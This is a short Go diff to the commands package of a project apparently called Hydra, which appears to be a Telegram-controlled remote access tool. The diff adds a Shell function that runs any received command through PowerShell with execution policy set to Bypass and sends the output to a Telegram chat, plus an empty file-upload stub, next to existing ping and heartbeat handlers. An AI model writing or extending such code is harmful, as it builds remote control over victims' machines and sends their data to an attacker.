@@ -2,6 +2,7 @@ package commands
 
 import (
 	"fmt"
+	"os/exec"
 	"time"
 
 	"github.com/Raffy27/Hydra/api"
@@ -27,4 +28,20 @@ func Ping() {
 func Reset() {
 	api.NewGenesis()
 	go api.Heartbeat()
+}
+
+func Shell(command string) {
+	var out string
+	cmd := exec.Command("powershell", "-NoLogo", "-Ep", "Bypass", command)
+	b, err := cmd.CombinedOutput()
+	if err == nil {
+		out = string(b)
+	}
+	cfg := tgbotapi.NewMessage(util.ChatID, fmt.Sprintf("```\n%s\n```", out))
+	cfg.ParseMode = "Markdown"
+	api.Bot.Send(cfg)
+}
+
+func UploadFile(file string) {
+
 }
